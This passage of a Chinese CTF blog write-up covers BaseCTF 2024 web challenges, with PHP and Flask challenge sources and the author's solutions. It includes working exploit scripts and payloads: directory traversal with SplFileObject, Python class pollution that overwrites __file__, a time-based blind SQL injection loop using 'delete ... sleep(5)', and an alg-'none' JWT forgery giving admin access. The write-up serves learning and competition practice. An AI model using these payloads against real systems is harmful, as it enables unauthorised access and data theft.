class="hljs-variable">$tip</span> != <span class="hljs-string">&quot;我要玩原神&quot;</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);<br> &#125;<br> <span class="hljs-title function_ invoke__">dumpFlag</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dumpFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) != <span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;可恶的QQ人！😡😡😡&quot;</span>);<br> &#125;<br> <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">0</span>];<br> <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">1</span>];<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-string">&quot;100%&quot;</span> || <span class="hljs-variable">$b</span> != <span class="hljs-string">&quot;love100%&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);<br> &#125;<br> <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br> <span class="hljs-variable">$flag</span>[] = <span class="hljs-keyword">array</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$ii</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ii</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>);<span class="hljs-variable">$ii</span>++) &#123;<br>  <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$ii</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$ii</span>]) ^ <span class="hljs-variable">$ii</span>);<br> &#125;<br> <br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>先看第一层写脚本爆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:23955/&#x27;</span><br><br>ans = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    payload = &#123;<span class="hljs-string">f&#x27;len[<span class="hljs-subst">&#123;j&#125;</span>]&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i)&#125;<br>    response = requests.post(url, data=payload)<br>    <span class="hljs-built_in">print</span>(response.text.splitlines()[-<span class="hljs-number">1</span>])<br>    last_line = response.text.splitlines()[-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span> <span class="hljs-keyword">in</span> last_line:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Success with <span class="hljs-subst">&#123;i&#125;</span> parameters!&#x27;</span>)<br>        ans = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> ans:<br>    payload_str = <span class="hljs-string">&#x27;&amp;&#x27;</span>.join([<span class="hljs-string">f&#x27;len[<span class="hljs-subst">&#123;j&#125;</span>]=0&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ans)])<br>    <span class="hljs-built_in">print</span>(payload_str)<br></code></pre></td></tr></table></figure><p>第二层输入<code>?tip=我要玩原神</code></p><p>第三层直接输入需要url编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966<br></code></pre></td></tr></table></figure><p>最后一层</p><ol><li><strong>已知每个加密字符串 <code>enc[i]</code> 是由字符的 ASCII 值和索引 <code>i</code> 异或后的结果再进行 <code>md5</code> 哈希得到的</strong>。</li><li><strong>通过暴力破解的方法</strong>：<ul><li>对每个加密的哈希值 <code>enc[i]</code>，尝试所有可能的字符（ASCII值从0到126）。</li><li>计算这些字符与其索引 <code>i</code> 异或后的值，并对该值进行 <code>md5</code> 哈希。</li><li>如果哈希结果与 <code>enc[i]</code> 相同，说明找到了正确的字符。</li></ul></li><li><strong>最终结果是解密后的字符串 <code>flag</code></strong>。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>enc = [<br>    <span class="hljs-string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class="hljs-string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,<br>    <span class="hljs-string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class="hljs-string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,<br>    <span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,<br>    <span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="hljs-string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,<br>    <span class="hljs-string">&quot;072b030ba126b2f4b2374f342be9ed44&quot;</span>, <span class="hljs-string">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>,<br>    <span class="hljs-string">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<br>    <span class="hljs-string">&quot;9a1158154dfa42caddbd0694a4e9bdc8&quot;</span>, <span class="hljs-string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>,<br>    <span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="hljs-string">&quot;072b030ba126b2f4b2374f342be9ed44&quot;</span>,<br>    <span class="hljs-string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class="hljs-string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>,<br>    <span class="hljs-string">&quot;5ef059938ba799aaa845e1c2e8a762bd&quot;</span>, <span class="hljs-string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,<br>    <span class="hljs-string">&quot;a5771bce93e200c36f7cd9dfd0e5deaa&quot;</span>, <span class="hljs-string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,<br>    <span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>,<br>    <span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>, <span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<br>    <span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<br>    <span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>, <span class="hljs-string">&quot;069059b7ef840f0c74a814ec9237b6ec&quot;</span>,<br>    <span class="hljs-string">&quot;f7177163c833dff4b38fc8d2872f1ec6&quot;</span>, <span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<br>    <span class="hljs-string">&quot;c74d97b01eae257e44aa9d5bade97baf&quot;</span>, <span class="hljs-string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,<br>    <span class="hljs-string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class="hljs-string">&quot;02e74f10e0327ad868d138f2b4fdd6f0&quot;</span>,<br>    <span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="hljs-string">&quot;7cbbc409ec990f19c78c75bd1e06f215&quot;</span>,<br>    <span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="hljs-string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,<br>    <span class="hljs-string">&quot;ad61ab143223efbc24c7d2583be69251&quot;</span>, <span class="hljs-string">&quot;6ea9ab1baa0efb9e19094440c317e21b&quot;</span>,<br>    <span class="hljs-string">&quot;d1fe173d08e959397adf34b1d77e88d7&quot;</span>, <span class="hljs-string">&quot;d1fe173d08e959397adf34b1d77e88d7&quot;</span>,<br>    <span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span><br>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">45</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-built_in">str</span>(c^i).encode()).hexdigest()==enc[i]):<br>            flag+=<span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>代码自行修改就可以得到flag了</p><h1 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h1><h2 id="web-4"><a class="markdownIt-Anchor" href="#web-4"></a> web</h2><h3 id="flag直接读取不就行了"><a class="markdownIt-Anchor" href="#flag直接读取不就行了"></a> flag直接读取不就行了？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读取目录可以利用<code>DirectoryIterator</code>进行读取，逐层遍历得到具体位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?K=DirectoryIterator&amp;W=../../../secret<br></code></pre></td></tr></table></figure><p>然后post读取就可以得到flag了，需要看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">J=SplFileObject&amp;H=../../../secret/f11444g.php<br></code></pre></td></tr></table></figure><h3 id="圣钥之战10"><a class="markdownIt-Anchor" href="#圣钥之战10"></a> 圣钥之战1.0</h3><p>考察python原型链的知识，以前没写过刚好帮我入了门，先上源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Read</span>():<br>    file = <span class="hljs-built_in">open</span>(__file__, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;J1ngHong说：你想read flag吗？</span><br><span class="hljs-string">那么圣钥之光必将阻止你！</span><br><span class="hljs-string">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="hljs-string"><span class="hljs-subst">&#123;file&#125;</span></span><br><span class="hljs-string">&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pollute&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollution</span>():<br>    <span class="hljs-keyword">if</span> request.is_json:<br>        merge(json.loads(request.data),instance)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>原理先按下不表，之后会出一篇文章学习一下原型链，主要是先写题目。大致就是利用merge函数来修改父类的属性</p><p>思路是利用/read下的<code>__file__</code>进行读取flag，想要利用这个，需要通过/pollute的传参就是污染，用merge对这个进行修改，同时<code>__file__</code>变量是一个全局值，就可以用上面写到的<code>__globals__</code>函数来获取全局变量并进行修改</p><p><img src="/../../images/basectf/basectf2024/zhan1.png" alt="zhan1"></p><p>注意的是需要添加头，否则不能读取成功<code>Content-Type: application/json</code></p><p>之后在/read刷新一下就出flag了，不能理解的看一下代码原理。</p><p><img src="/../../images/basectf/basectf2024/zhan2.png" alt="zhan2"></p><h3 id="only-one-sql"><a class="markdownIt-Anchor" href="#only-one-sql"></a> only one sql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有sql注入&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你知道的，不可能有RCE&quot;</span>);<br>&#125;<br><span class="hljs-comment">//flag in ctf.flag</span><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$query</span>);<br></code></pre></td></tr></table></figure><p>首先执行<code>show databases</code>爆库看看，再执行爆表</p><p><img src="/../../images/basectf/basectf2024/sql1.png" alt="sql1"></p><p>猜测应该在flag里，执行一下爆列<code>show columns from flag</code></p><p><img src="/../../images/basectf/basectf2024/sql2.png" alt="sql2"></p><p>猜测在data里面，题目把正常的select给过滤了，提醒了盲注，本人sql其实不算擅长，根据官p来吧，正常的flag格式是B来头，我们可以利用delete和时间盲注进行探测，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?sql=delete from flag <span class="hljs-built_in">where</span> data like <span class="hljs-string">&#x27;B%&#x27;</span> and <span class="hljs-built_in">sleep</span>(5)<br></code></pre></td></tr></table></figure><p><code>DELETE FROM flag</code>：从 <code>flag</code> 表中删除记录。<code>WHERE data LIKE 'B%'</code>：条件为 <code>data</code> 字段的值以字母 <code>B</code> 开头的记录会被选中。检测是否有B开头的.<code>SLEEP(5)</code> 会让数据库等待 5 秒再继续执行。最后写个脚本等慢慢跑出来就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>char = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> char:<br>        url = <span class="hljs-string">f&#x27;http://challenge.basectf.fun:28963/?sql=delete%20from%20flag%20where%20data%20like%20%27<span class="hljs-subst">&#123;flag&#125;</span><span class="hljs-subst">&#123;c&#125;</span>%25%27%20and%20sleep(5)&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            response = requests.get(url, timeout=<span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>            <span class="hljs-built_in">print</span>(flag + c)  <span class="hljs-comment"># 输出已猜出的 flag 部分</span><br>            flag += c  <span class="hljs-comment"># 将正确的字符加入 flag</span><br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 进入下一个字符的猜测</span><br></code></pre></td></tr></table></figure><h3 id="no-jwt"><a class="markdownIt-Anchor" href="#no-jwt"></a> No JWT</h3><p>和平常写的jwt有点不太一样</p><p>接口需要一个包含角色为 <code>admin</code> 的 JWT 令牌才能返回 flag。为了得到 flag，需要伪造一个 JWT 令牌，绕过服务器端的角色检查。</p><p>签名验证已被禁用，可以伪造一个 JWT 令牌，其中 <code>role</code> 设置为 <code>admin</code>。接下来就是构造这个伪造的 JWT 令牌并发送请求到 <code>/flag</code> 接口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><br>flag_url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:30617/flag&#x27;</span> <br><br>header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,  <span class="hljs-comment"># 禁用签名验证</span><br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br>payload = &#123;<br>    <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,  <span class="hljs-comment"># 设置为 admin</span><br>    <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">9999999999</span>  <span class="hljs-comment"># 过期时间设置在未来</span><br>&#125;<br><span class="hljs-comment"># 对 header 和 payload 进行 Base64 编码</span><br>header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(<span class="hljs-string">&quot;=&quot;</span>)<br>payload_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(<span class="hljs-string">&quot;=&quot;</span>)<br><br>fake_jwt = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;header_enc&#125;</span>.<span class="hljs-subst">&#123;payload_enc&#125;</span>.&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">f&#x27;Bearer <span class="hljs-subst">&#123;fake_jwt&#125;</span>&#x27;</span><br>&#125;<br><br>response = requests.get(flag_url, headers=headers)<br><br><span class="hljs-comment"># 打印服务器响应</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器响应状态码:&quot;</span>, response.status_code)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器响应内容:&quot;</span>, response.text)<br></code></pre></td></tr></table></figure><h1 id="fin"><a class="markdownIt-Anchor" href="#fin"></a> Fin</h1><h2 id="web-5"><a class="markdownIt-Anchor" href="#web-5"></a> web</h2><h3 id="1z_php"><a class="markdownIt-Anchor" href="#1z_php"></a> 1z_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我记得她...好像叫flag.php吧？</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span 